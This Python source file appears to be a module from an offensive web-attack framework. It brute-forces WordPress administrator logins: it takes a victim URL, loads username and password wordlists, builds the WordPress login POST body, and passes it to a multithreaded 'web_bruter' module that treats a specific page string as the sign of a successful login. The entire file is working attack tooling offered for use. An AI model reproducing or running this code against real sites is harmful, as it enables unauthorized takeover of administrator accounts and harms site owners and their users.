#  Copyright 2012 Kid :">

from w2a.core.templates import Templates
from w2a.config import CONFIG
from w2a.lib.net.http import HTTP

from urllib.parse import quote_plus
class Module(Templates):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.version		= 1
		self.author			= [ 'Kid' ]
		self.description 	= 'Brute wordpress administrator account'
		self.detailed_description	= 'This module retreives connect with dictionary username and password'
		#########################################
		self.options.addString('URL', 'Link login')
		self.options.addString('USERNAME', 'Account login', False, default = 'admin')
		self.options.addString('PASSWORD', 'Password login', False)
		self.options.addInteger('THREADS', 'Thread of bruter', default = 5)
		self.options.addBoolean('VERBOSE', 'Verbose', default = True)
		self.options.addPath('USERLIST', 'File containing passwords to test', default = CONFIG.DATA_PATH + '/brute/username.lst')
		self.options.addPath('PASSLIST', 'File containing usernames to test', default = CONFIG.DATA_PATH + '/brute/pass.vn')
		
		self.advanced_options.addInteger('TIMEOUT', 'Time out request', default = CONFIG.TIME_OUT)
		self.advanced_options.addInteger('DELAY', 'Delay time if thread = 1', default = 1)
	def run(self, frmwk, args):
		module_name		= 'attack/web_bruter'

		frmwk.print_status('Init paprams!')
		victim				= HTTP(self.options['URL'], timeout = self.advanced_options['TIMEOUT'])
		victim.storecookie	= True
		checktype			= 'successstr'
		tokenstr			= 'no-unread-messages'

		param		= 'log=__USER__&pwd=__PASS__&wp-submit=Log+In&redirect_to='+quote_plus(self.options['URL'])+'&testcookie=1'
		frmwk.print_status('Start bruteforcer!')
		bruter	= frmwk.modules[module_name]
		bruter.options.addString('URL', 'Link login', default = self.options['URL'])
		bruter.options.addString('USERNAME', 'Account login', default = self.options['USERNAME'])
		bruter.options.addString('PASSWORD', 'Password login', default = self.options['PASSWORD'])
		bruter.options.addString('DATA', 'Date with POST method', default = param)
		bruter.options.addString('CHECKTYPE', 'Type of checker success login', default = checktype)
		bruter.options.addString('TOKEN', 'Error string', default = tokenstr)
		bruter.options.addInteger('THREADS', 'Date with POST method', default = self.options['THREADS'])
		bruter.options.addPath('USERLIST', 'passwords to test', default = self.options['USERLIST'])
		bruter.options.addPath('PASSLIST', 'usernames to test', default = self.options['PASSLIST'])
		bruter.options.addBoolean('VERBOSE', 'Verbose', default = self.options['VERBOSE'])
		bruter.advanced_options.addString('COOKIE', 'Cookie', default = victim.headers['Cookie'] if victim.headers['Cookie'] else None)
		bruter.advanced_options.addInteger('DELAY', 'Delay time', default = self.advanced_options['DELAY'])
		bruter.advanced_options.addInteger('TIMEOUT', 'Time out request', default = self.advanced_options['TIMEOUT'])
		bruter.advanced_options.addBoolean('STOP', 'Stop scanning', default = True)
		bruter.run(frmwk, None)
		frmwk.reload_module(module_name)